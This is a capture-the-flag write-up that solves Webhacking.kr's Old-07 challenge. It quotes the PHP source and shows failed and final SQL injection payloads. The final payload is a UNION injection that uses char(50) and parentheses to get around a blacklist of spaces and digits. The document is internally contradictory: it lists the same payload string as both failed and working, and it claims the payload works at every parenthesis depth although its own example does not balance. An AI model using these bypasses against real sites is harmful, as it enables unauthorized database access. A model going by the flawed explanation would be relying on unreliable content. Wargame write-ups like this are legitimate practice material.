---
title: "Webhacking.kr Old-07"
date: 2026-05-15
published: 2026-05-15 
tags: ["SQLi", "webhacking.kr", "writeup", "union-based"]
category: "Webhacking.kr"  
description: "Bypassing blacklist with char(50) and parentheses to get admin access"
---

# 🔓 Webhacking.kr Challenge Old-07

**Category:** Web / SQL Injection  
**Difficulty:** ⭐⭐☆☆☆ (Easy-Medium)  
**Link:** `https://webhacking.kr/challenge/web-07/index.php?val=1`

---

## 📝 Challenge Description

A simple admin page with an "auth" button. Clicking it gives `Access_Denied!`.  
We need to make the database return `lv = 2` to see `Hello admin` and solve the challenge.

---

## 🔍 source code + writeup

Key points from `?view_source=1`:

```php
// Blacklist - blocks these characters
preg_match("/2|-|\+|from|_|=|\\s|\*|\//i", $go)

// Random parentheses (1 to 5 levels around our input)
$rand = rand(1,5);
if($rand==1) $result = mysqli_query($db,"select lv from chall7 where lv=($go)");
if($rand==2) $result = mysqli_query($db,"select lv from chall7 where lv=(($go))");
if($rand==3) $result = mysqli_query($db,"select lv from chall7 where lv=((($go)))");
if($rand==4) $result = mysqli_query($db,"select lv from chall7 where lv=(((($go))))");
if($rand==5) $result = mysqli_query($db,"select lv from chall7 where lv=((((($go)))))");

// What we need to trigger
if($data[0]==2) {
    echo("Hello admin");
    solve(7);  // 🏆 challenge solved
}



Failed Attempts
Payload	Why it failed
1) union select 2	2 + space blocked ❌
1)union(select(2))	2 still blocked ❌
1)union(select(0x32))	blocked by 2 pattern ❌
1)union(select(char(50)))	1) returns existing row, messing up union ❌
0)union(select(char(50))	Missing closing parenthesis ❌
0)union(select(char(50)))	✅ WORKED!
✅ Final Working Payload
sql
0)union(select(char(50))
Full URL:

text
https://webhacking.kr/challenge/web-07/index.php?val=0)union(select(char(50))
🧠 Why It Works
1. Bypassing the 2 blacklist
char(50) returns ASCII character 50 = '2'

In MySQL, string '2' automatically casts to integer 2 when compared with lv column

2. Bypassing space blacklist
No spaces needed: union(select(...)) is valid SQL

Parentheses replace spaces entirely

3. Bypassing from blacklist
SELECT char(50) doesn't need a FROM table because we're selecting a literal value

4. Handling extra parentheses (1-5 levels)
The challenge wraps our input in 1-5 parentheses. Our payload works inside ALL of them:

sql
-- Example with 3 parentheses (when rand=3)
select lv from chall7 where lv=(((0)union(select(char(50)))))
--                              ^^^                 ^^^
-- Extra parentheses don't break the injection ✅
5. Why 0) instead of 1)?
lv=1 exists in the table → original query returns a row

lv=0 doesn't exist → ONLY our union result returns

This gives a cleaner injection without mixing results

6. How the query executes
sql
-- Step 1: Original query finds nothing (lv=0 doesn't exist)
-- Step 2: UNION combines with our SELECT
-- Step 3: Our SELECT returns '2' via char(50)
-- Step 4: MySQL casts '2' to integer 2
-- Step 5: $data[0] == 2 → Hello admin! ✅
🎯 Result
After sending the payload:

text
✅ Alert: "Hello admin"
✅ Challenge 7 solved!